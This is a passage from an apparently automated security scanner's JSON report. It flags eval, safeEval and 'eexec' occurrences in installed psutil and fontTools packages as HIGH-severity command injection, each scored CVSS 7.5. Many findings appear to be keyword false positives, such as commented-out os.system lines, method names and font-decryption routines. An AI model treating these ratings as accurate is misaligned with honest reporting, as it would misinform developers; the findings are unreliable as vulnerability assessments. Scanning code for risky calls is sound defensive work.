            "context": "        tcp4_proc = self.pyrun(tcp4_template)\n        tcp4_addr = eval(wait_for_file(testfile, delete=True))\n        udp4_proc = self.pyrun(udp4_template)\n        udp4_addr = eval(wait_for_file(testfile, delete=True))\n        if supports_ipv6():\n            tcp6_proc = self.pyrun(tcp6_template)\n            tcp6_addr = eval(wait_for_file(testfile, delete=True))",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/psutil/tests/test_connections.py",
            "line": 364,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "tcp6_addr = eval(wait_for_file(testfile, delete=True))",
            "context": "        udp4_addr = eval(wait_for_file(testfile, delete=True))\n        if supports_ipv6():\n            tcp6_proc = self.pyrun(tcp6_template)\n            tcp6_addr = eval(wait_for_file(testfile, delete=True))\n            udp6_proc = self.pyrun(udp6_template)\n            udp6_addr = eval(wait_for_file(testfile, delete=True))\n        else:",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/psutil/tests/test_connections.py",
            "line": 366,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "udp6_addr = eval(wait_for_file(testfile, delete=True))",
            "context": "            tcp6_proc = self.pyrun(tcp6_template)\n            tcp6_addr = eval(wait_for_file(testfile, delete=True))\n            udp6_proc = self.pyrun(udp6_template)\n            udp6_addr = eval(wait_for_file(testfile, delete=True))\n        else:\n            tcp6_proc = None\n            udp6_proc = None",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/psutil/tests/__init__.py",
            "line": 1370,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "#     os.system(\"tasklist\")",
            "context": "    sys.stdout.flush()\n\n    # if WINDOWS:\n    #     os.system(\"tasklist\")\n    # elif shutil.which(\"ps\"):\n    #     os.system(\"ps aux\")\n    # print(\"=\" * 70, file=sys.stderr)",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/psutil/tests/__init__.py",
            "line": 1372,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "#     os.system(\"ps aux\")",
            "context": "    # if WINDOWS:\n    #     os.system(\"tasklist\")\n    # elif shutil.which(\"ps\"):\n    #     os.system(\"ps aux\")\n    # print(\"=\" * 70, file=sys.stderr)\n\n    sys.stdout.flush()",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/t1Lib/__init__.py",
            "line": 158,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "eexec_portion = self.encode_eexec(eexec_dict)",
            "context": "            else:\n                lines.extend(self._make_lines(key, value))\n        lines.append(b\"end\")\n        eexec_portion = self.encode_eexec(eexec_dict)\n        lines.append(bytesjoin([b\"currentfile eexec \", eexec_portion]))\n\n        for _ in range(8):",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/t1Lib/__init__.py",
            "line": 168,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "def encode_eexec(self, eexec_dict):",
            "context": "        data = bytesjoin(lines, \"\\n\")\n        return data\n\n    def encode_eexec(self, eexec_dict):\n        lines = []\n\n        # '-|', '|-', '|'",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/cffLib/__init__.py",
            "line": 1100,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "fdID = safeEval(attrs[\"fdSelectIndex\"])",
            "context": "            fdID = -1\n            if hasattr(self, \"fdArray\"):\n                try:\n                    fdID = safeEval(attrs[\"fdSelectIndex\"])\n                except KeyError:\n                    fdID = 0\n                private = self.fdArray[fdID].Private",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/cffLib/__init__.py",
            "line": 1267,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "blendList = [eval(val) for val in blendList]",
            "context": "            continue\n        name, attrs, content = element\n        blendList = attrs[\"value\"].split()\n        blendList = [eval(val) for val in blendList]\n        valueList.append(blendList)\n    if len(valueList) == 1:\n        valueList = valueList[0]",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/cffLib/__init__.py",
            "line": 1718,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "code = safeEval(attrs[\"code\"])",
            "context": "            if isinstance(element, str):\n                continue\n            name, attrs, content = element\n            code = safeEval(attrs[\"code\"])\n            glyphName = attrs[\"name\"]\n            encoding[code] = glyphName\n        return encoding",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/cffLib/__init__.py",
            "line": 1883,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "fmt = safeEval(attrs[\"format\"])",
            "context": "        xmlWriter.newline()\n\n    def xmlRead(self, name, attrs, content, parent):\n        fmt = safeEval(attrs[\"format\"])\n        file = None\n        numGlyphs = None\n        fdSelect = FDSelect(file, numGlyphs, fmt)",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/cffLib/__init__.py",
            "line": 2026,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "return (attrs[\"Registry\"], attrs[\"Order\"], safeEval(attrs[\"Supplement\"]))",
            "context": "        xmlWriter.newline()\n\n    def xmlRead(self, name, attrs, content, parent):\n        return (attrs[\"Registry\"], attrs[\"Order\"], safeEval(attrs[\"Supplement\"]))\n\n\ntopDictOperators = [",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/feaLib/builder.py",
            "line": 498,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "table.achVendID = safeEval(\"'''\" + self.os2_[\"vendor\"] + \"'''\")",
            "context": "        if \"windescent\" in self.os2_:\n            table.usWinDescent = self.os2_[\"windescent\"]\n        if \"vendor\" in self.os2_:\n            table.achVendID = safeEval(\"'''\" + self.os2_[\"vendor\"] + \"'''\")\n        if \"weightclass\" in self.os2_:\n            table.usWeightClass = self.os2_[\"weightclass\"]\n        if \"widthclass\" in self.os2_:",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/misc/xmlReader.py",
            "line": 106,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "sfntVersion = safeEval('\"' + sfntVersion + '\"')",
            "context": "                sfntVersion = attrs.get(\"sfntVersion\")\n                if sfntVersion is not None:\n                    if len(sfntVersion) != 4:\n                        sfntVersion = safeEval('\"' + sfntVersion + '\"')\n                    self.ttFont.sfntVersion = sfntVersion\n            self.contentStack.append([])\n        elif stackSize == 1:",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/misc/xmlReader.py",
            "line": 122,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "elif \"ERROR\" in attrs or (\"raw\" in attrs and safeEval(attrs[\"raw\"])):",
            "context": "            log.info(msg)\n            if tag == \"GlyphOrder\":\n                tableClass = ttLib.GlyphOrder\n            elif \"ERROR\" in attrs or (\"raw\" in attrs and safeEval(attrs[\"raw\"])):\n                tableClass = DefaultTable\n            else:\n                tableClass = ttLib.getTableClass(tag)",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/misc/symfont.py",
            "line": 241,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "funcs = [(name, eval(f)) for name, f in zip(sys.argv[2::2], sys.argv[3::2])]",
            "context": "\n    if sys.argv[1:]:\n        penName = sys.argv[1]\n        funcs = [(name, eval(f)) for name, f in zip(sys.argv[2::2], sys.argv[3::2])]\n        printGreenPen(penName, funcs, file=sys.stdout)\n",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/misc/psLib.py",
            "line": 152,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "def starteexec(self):",
            "context": "        _, nextpos = whitematch(self.buf, self.pos).span()\n        self.pos = nextpos\n\n    def starteexec(self):\n        self.pos = self.pos + 1\n        self.dirtybuf = self.buf[self.pos :]\n        self.buf, R = eexec.decrypt(self.dirtybuf, 55665)",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/misc/psLib.py",
            "line": 159,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "def stopeexec(self):",
            "context": "        self.len = len(self.buf)\n        self.pos = 4\n\n    def stopeexec(self):\n        if not hasattr(self, \"dirtybuf\"):\n            return\n        self.buf = self.dirtybuf",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/misc/psOperators.py",
            "line": 270,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "def ps_exec(self):",
            "context": "            raise RuntimeError(\"stack underflow\")\n        self.push(self.stack[-1])\n\n    def ps_exec(self):\n        obj = self.pop()\n        if obj.type == \"proceduretype\":\n            self.call_procedure(obj)",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/misc/psOperators.py",
            "line": 341,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "def ps_eexec(self):",
            "context": "    def ps_currentfile(self):\n        self.push(ps_file(self.tokenizer))\n\n    def ps_eexec(self):\n        f = self.pop(\"filetype\").value\n        f.starteexec()\n",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/misc/psOperators.py",
            "line": 343,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "f.starteexec()",
            "context": "\n    def ps_eexec(self):\n        f = self.pop(\"filetype\").value\n        f.starteexec()\n\n    def ps_closefile(self):\n        f = self.pop(\"filetype\").value",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/misc/psOperators.py",
            "line": 348,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "f.stopeexec()",
            "context": "    def ps_closefile(self):\n        f = self.pop(\"filetype\").value\n        f.skipwhite()\n        f.stopeexec()\n\n    def ps_cleartomark(self):\n        obj = self.pop()",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/_t_r_a_k.py",
            "line": 118,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "self.version = safeEval(attrs[\"value\"])",
            "context": "\n    def fromXML(self, name, attrs, content, ttFont):\n        if name == \"version\":\n            self.version = safeEval(attrs[\"value\"])\n        elif name == \"format\":\n            self.format = safeEval(attrs[\"value\"])\n        elif name in (\"horizData\", \"vertData\"):",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/_t_r_a_k.py",
            "line": 120,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "self.format = safeEval(attrs[\"value\"])",
            "context": "        if name == \"version\":\n            self.version = safeEval(attrs[\"value\"])\n        elif name == \"format\":\n            self.format = safeEval(attrs[\"value\"])\n        elif name in (\"horizData\", \"vertData\"):\n            trackData = TrackData()\n            setattr(self, name, trackData)",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/_t_r_a_k.py",
            "line": 292,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "self.nameIndex = safeEval(attrs[\"nameIndex\"])",
            "context": "\n    def fromXML(self, name, attrs, content, ttFont):\n        self.track = str2fl(attrs[\"value\"], 16)\n        self.nameIndex = safeEval(attrs[\"nameIndex\"])\n        for element in content:\n            if not isinstance(element, tuple):\n                continue",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/_t_r_a_k.py",
            "line": 300,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "self[size] = safeEval(attrs[\"value\"])",
            "context": "            if name != \"track\":\n                continue\n            size = str2fl(attrs[\"size\"], 16)\n            self[size] = safeEval(attrs[\"value\"])\n\n    def __getitem__(self, size):\n        return self._map[size]",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/BitmapGlyphMetrics.py",
            "line": 50,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "vars(self)[name] = safeEval(attrs[\"value\"])",
            "context": "            name, attrs, content = element\n            # Make sure this is a metric that is needed by GlyphMetrics.\n            if name in metricNames:\n                vars(self)[name] = safeEval(attrs[\"value\"])\n            else:\n                log.warning(\n                    \"unknown name '%s' being ignored in %s.\",",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/otTables.py",
            "line": 350,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "self.conditionIndex = safeEval(v)",
            "context": "            if name == \"glyphName\":\n                self.glyphName = v\n            elif name == \"conditionIndex\":\n                self.conditionIndex = safeEval(v)\n            elif name == \"axisIndicesIndex\":\n                self.axisIndicesIndex = safeEval(v)\n            elif name == \"axisValues\":",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/otTables.py",
            "line": 352,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "self.axisIndicesIndex = safeEval(v)",
            "context": "            elif name == \"conditionIndex\":\n                self.conditionIndex = safeEval(v)\n            elif name == \"axisIndicesIndex\":\n                self.axisIndicesIndex = safeEval(v)\n            elif name == \"axisValues\":\n                self.axisValues = tuple(str2fl(v, 14) for v in safeEval(v))\n                if safeEval(attrs.get(\"resetUnspecifiedAxes\", \"0\")):",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/otTables.py",
            "line": 354,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "self.axisValues = tuple(str2fl(v, 14) for v in safeEval(v))",
            "context": "            elif name == \"axisIndicesIndex\":\n                self.axisIndicesIndex = safeEval(v)\n            elif name == \"axisValues\":\n                self.axisValues = tuple(str2fl(v, 14) for v in safeEval(v))\n                if safeEval(attrs.get(\"resetUnspecifiedAxes\", \"0\")):\n                    self.flags |= VarComponentFlags.RESET_UNSPECIFIED_AXES\n            elif name == \"axisValuesVarIndex\":",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/otTables.py",
            "line": 355,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "if safeEval(attrs.get(\"resetUnspecifiedAxes\", \"0\")):",
            "context": "                self.axisIndicesIndex = safeEval(v)\n            elif name == \"axisValues\":\n                self.axisValues = tuple(str2fl(v, 14) for v in safeEval(v))\n                if safeEval(attrs.get(\"resetUnspecifiedAxes\", \"0\")):\n                    self.flags |= VarComponentFlags.RESET_UNSPECIFIED_AXES\n            elif name == \"axisValuesVarIndex\":\n                self.axisValuesVarIndex = safeEval(v)",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/otTables.py",
            "line": 358,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "self.axisValuesVarIndex = safeEval(v)",
            "context": "                if safeEval(attrs.get(\"resetUnspecifiedAxes\", \"0\")):\n                    self.flags |= VarComponentFlags.RESET_UNSPECIFIED_AXES\n            elif name == \"axisValuesVarIndex\":\n                self.axisValuesVarIndex = safeEval(v)\n            elif name == \"transformVarIndex\":\n                self.transformVarIndex = safeEval(v)\n            elif name in VAR_TRANSFORM_MAPPING:",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/otTables.py",
            "line": 360,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "self.transformVarIndex = safeEval(v)",
            "context": "            elif name == \"axisValuesVarIndex\":\n                self.axisValuesVarIndex = safeEval(v)\n            elif name == \"transformVarIndex\":\n                self.transformVarIndex = safeEval(v)\n            elif name in VAR_TRANSFORM_MAPPING:\n                setattr(\n                    self.transform,",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/otTables.py",
            "line": 365,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "safeEval(v),",
            "context": "                setattr(\n                    self.transform,\n                    name,\n                    safeEval(v),\n                )\n                self.flags |= VAR_TRANSFORM_MAPPING[name].flag\n            else:",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/otTables.py",
            "line": 546,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "self.NewState = safeEval(eltAttrs[\"value\"])",
            "context": "        content = [t for t in content if isinstance(t, tuple)]\n        for eltName, eltAttrs, eltContent in content:\n            if eltName == \"NewState\":\n                self.NewState = safeEval(eltAttrs[\"value\"])\n            elif eltName == \"Verb\":\n                self.Verb = safeEval(eltAttrs[\"value\"])\n            elif eltName == \"ReservedFlags\":",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/otTables.py",
            "line": 548,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "self.Verb = safeEval(eltAttrs[\"value\"])",
            "context": "            if eltName == \"NewState\":\n                self.NewState = safeEval(eltAttrs[\"value\"])\n            elif eltName == \"Verb\":\n                self.Verb = safeEval(eltAttrs[\"value\"])\n            elif eltName == \"ReservedFlags\":\n                self.ReservedFlags = safeEval(eltAttrs[\"value\"])\n            elif eltName == \"Flags\":",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/otTables.py",
            "line": 550,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "self.ReservedFlags = safeEval(eltAttrs[\"value\"])",
            "context": "            elif eltName == \"Verb\":\n                self.Verb = safeEval(eltAttrs[\"value\"])\n            elif eltName == \"ReservedFlags\":\n                self.ReservedFlags = safeEval(eltAttrs[\"value\"])\n            elif eltName == \"Flags\":\n                for flag in eltAttrs[\"value\"].split(\",\"):\n                    self._setFlag(flag.strip())",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/otTables.py",
            "line": 609,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "self.NewState = safeEval(eltAttrs[\"value\"])",
            "context": "        content = [t for t in content if isinstance(t, tuple)]\n        for eltName, eltAttrs, eltContent in content:\n            if eltName == \"NewState\":\n                self.NewState = safeEval(eltAttrs[\"value\"])\n            elif eltName == \"Flags\":\n                for flag in eltAttrs[\"value\"].split(\",\"):\n                    self._setFlag(flag.strip())",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/otTables.py",
            "line": 614,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "self.ReservedFlags = safeEval(eltAttrs[\"value\"])",
            "context": "                for flag in eltAttrs[\"value\"].split(\",\"):\n                    self._setFlag(flag.strip())\n            elif eltName == \"ReservedFlags\":\n                self.ReservedFlags = safeEval(eltAttrs[\"value\"])\n            elif eltName == \"MarkIndex\":\n                self.MarkIndex = safeEval(eltAttrs[\"value\"])\n            elif eltName == \"CurrentIndex\":",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/otTables.py",
            "line": 616,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "self.MarkIndex = safeEval(eltAttrs[\"value\"])",
            "context": "            elif eltName == \"ReservedFlags\":\n                self.ReservedFlags = safeEval(eltAttrs[\"value\"])\n            elif eltName == \"MarkIndex\":\n                self.MarkIndex = safeEval(eltAttrs[\"value\"])\n            elif eltName == \"CurrentIndex\":\n                self.CurrentIndex = safeEval(eltAttrs[\"value\"])\n",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/otTables.py",
            "line": 618,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "self.CurrentIndex = safeEval(eltAttrs[\"value\"])",
            "context": "            elif eltName == \"MarkIndex\":\n                self.MarkIndex = safeEval(eltAttrs[\"value\"])\n            elif eltName == \"CurrentIndex\":\n                self.CurrentIndex = safeEval(eltAttrs[\"value\"])\n\n\nclass LigAction(object):",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/otTables.py",
            "line": 747,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "self.NewState = safeEval(eltAttrs[\"value\"])",
            "context": "        content = [t for t in content if isinstance(t, tuple)]\n        for eltName, eltAttrs, eltContent in content:\n            if eltName == \"NewState\":\n                self.NewState = safeEval(eltAttrs[\"value\"])\n            elif eltName == \"Flags\":\n                for flag in eltAttrs[\"value\"].split(\",\"):\n                    self._setFlag(flag.strip())",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/otTables.py",
            "line": 752,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "self.ReservedFlags = safeEval(eltAttrs[\"value\"])",
            "context": "                for flag in eltAttrs[\"value\"].split(\",\"):\n                    self._setFlag(flag.strip())\n            elif eltName == \"ReservedFlags\":\n                self.ReservedFlags = safeEval(eltAttrs[\"value\"])\n            elif eltName == \"Action\":\n                action = LigAction()\n                flags = eltAttrs.get(\"Flags\", \"\").split(\",\")",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/otTables.py",
            "line": 758,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "action.GlyphIndexDelta = safeEval(eltAttrs[\"GlyphIndexDelta\"])",
            "context": "                flags = eltAttrs.get(\"Flags\", \"\").split(\",\")\n                flags = [f.strip() for f in flags]\n                action.Store = \"Store\" in flags\n                action.GlyphIndexDelta = safeEval(eltAttrs[\"GlyphIndexDelta\"])\n                self.Actions.append(action)\n\n    def toXML(self, xmlWriter, font, attrs, name):",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/otTables.py",
            "line": 869,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "self.NewState = safeEval(eltAttrs[\"value\"])",
            "context": "        content = [t for t in content if isinstance(t, tuple)]\n        for eltName, eltAttrs, eltContent in content:\n            if eltName == \"NewState\":\n                self.NewState = safeEval(eltAttrs[\"value\"])\n            elif eltName == \"Flags\":\n                for flag in eltAttrs[\"value\"].split(\",\"):\n                    self._setFlag(flag.strip())",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/otTables.py",
            "line": 1098,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "index = safeEval(attrs[\"index\"])",
            "context": "        mapping = getattr(self, \"mapping\", None)\n        if mapping is None:\n            self.mapping = mapping = []\n        index = safeEval(attrs[\"index\"])\n        outer = safeEval(attrs.get(\"outer\", \"0xFFFF\"))\n        inner = safeEval(attrs.get(\"inner\", \"0xFFFF\"))\n        assert inner <= 0xFFFF",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/otTables.py",
            "line": 1099,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "outer = safeEval(attrs.get(\"outer\", \"0xFFFF\"))",
            "context": "        if mapping is None:\n            self.mapping = mapping = []\n        index = safeEval(attrs[\"index\"])\n        outer = safeEval(attrs.get(\"outer\", \"0xFFFF\"))\n        inner = safeEval(attrs.get(\"inner\", \"0xFFFF\"))\n        assert inner <= 0xFFFF\n        mapping.insert(index, (outer << 16) | inner)",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/otTables.py",
            "line": 1100,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "inner = safeEval(attrs.get(\"inner\", \"0xFFFF\"))",
            "context": "            self.mapping = mapping = []\n        index = safeEval(attrs[\"index\"])\n        outer = safeEval(attrs.get(\"outer\", \"0xFFFF\"))\n        inner = safeEval(attrs.get(\"inner\", \"0xFFFF\"))\n        assert inner <= 0xFFFF\n        mapping.insert(index, (outer << 16) | inner)\n",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/otTables.py",
            "line": 1154,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "outer = safeEval(attrs[\"outer\"])",
            "context": "            glyph = attrs[\"glyph\"]\n        except:  # https://github.com/fonttools/fonttools/commit/21cbab8ce9ded3356fef3745122da64dcaf314e9#commitcomment-27649836\n            glyph = font.getGlyphOrder()[attrs[\"index\"]]\n        outer = safeEval(attrs[\"outer\"])\n        inner = safeEval(attrs[\"inner\"])\n        assert inner <= 0xFFFF\n        mapping[glyph] = (outer << 16) | inner",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/otTables.py",
            "line": 1155,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "inner = safeEval(attrs[\"inner\"])",
            "context": "        except:  # https://github.com/fonttools/fonttools/commit/21cbab8ce9ded3356fef3745122da64dcaf314e9#commitcomment-27649836\n            glyph = font.getGlyphOrder()[attrs[\"index\"]]\n        outer = safeEval(attrs[\"outer\"])\n        inner = safeEval(attrs[\"inner\"])\n        assert inner <= 0xFFFF\n        mapping[glyph] = (outer << 16) | inner\n",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/otTables.py",
            "line": 1729,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "if conv.aux and not eval(conv.aux, None, vars(self)):",
            "context": "                        xmlWriter, font, item, conv.name, [(\"index\", lookupIndex)]\n                    )\n            else:\n                if conv.aux and not eval(conv.aux, None, vars(self)):\n                    continue\n                value = getattr(\n                    self, conv.name, None",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/otTables.py",
            "line": 1912,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "clipBox.Format = safeEval(attrs[\"Format\"])",
            "context": "                glyphs.append(attrs[\"value\"])\n            elif name == \"ClipBox\":\n                clipBox = ClipBox()\n                clipBox.Format = safeEval(attrs[\"Format\"])\n                for elem in content:\n                    if not isinstance(elem, tuple):\n                        continue",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/T_S_I__5.py",
            "line": 60,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "self.glyphGrouping[attrs[\"name\"]] = safeEval(attrs[\"value\"])",
            "context": "            self.glyphGrouping = {}\n        if name != \"glyphgroup\":\n            return\n        self.glyphGrouping[attrs[\"name\"]] = safeEval(attrs[\"value\"])\n",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/_h_d_m_x.py",
            "line": 123,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "glyphName = safeEval('\"\"\"' + glyphName + '\"\"\"')",
            "context": "            if \"\\\\\" in glyphName:\n                from fontTools.misc.textTools import safeEval\n\n                glyphName = safeEval('\"\"\"' + glyphName + '\"\"\"')\n            line = list(map(int, line[1:]))\n            assert len(line) == len(ppems), \"illegal hdmx format\"\n            for i in range(len(ppems)):",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/V_D_M_X_.py",
